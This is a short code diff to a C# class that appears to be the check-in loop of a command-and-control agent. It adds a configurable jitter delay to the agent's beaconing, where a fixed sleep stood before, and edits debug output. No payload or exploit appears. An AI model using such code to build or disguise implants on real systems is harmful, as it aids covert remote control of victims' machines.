@@ -30,7 +30,7 @@ namespace Agent.Models
             _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
 
         }
-        public override async Task Start()
+        public override async Task Start(int jitterSeconds)
         {
             System.Console.WriteLine("Starting tasks loop?");
             _tokenSource = new CancellationTokenSource();
@@ -49,8 +49,8 @@ namespace Agent.Models
                     System.Console.WriteLine("checking in..");
                     await Checkin();
                 }
-                System.Console.WriteLine("Before SLEEP!");
-                await Task.Delay(5000);
+                System.Console.WriteLine("Before jitter SLEEP!");
+                await Task.Delay(jitterSeconds * 1000);
             }
         }
 
@@ -58,7 +58,6 @@ namespace Agent.Models
         {
             var response = await _client.GetByteArrayAsync("/");
             System.Console.WriteLine(response.ToString());
-            System.Console.WriteLine("After wait on get req");
             HandleResponse(response);
         }
 
